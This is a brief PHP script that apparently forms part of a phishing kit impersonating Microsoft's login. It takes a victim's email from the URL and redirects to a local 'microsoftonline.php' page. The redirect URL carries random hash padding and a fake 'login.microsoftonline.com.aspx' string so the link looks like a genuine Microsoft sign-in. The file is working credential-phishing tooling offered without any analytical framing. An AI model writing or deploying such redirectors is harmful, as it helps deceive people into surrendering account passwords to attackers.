<?php
$email = $_GET['email'];
$md5 = md5(rand());
header("Location: microsoftonline.php?$md5-$md5&email=$email&.rand=login.microsoftonline.com.aspx");
?>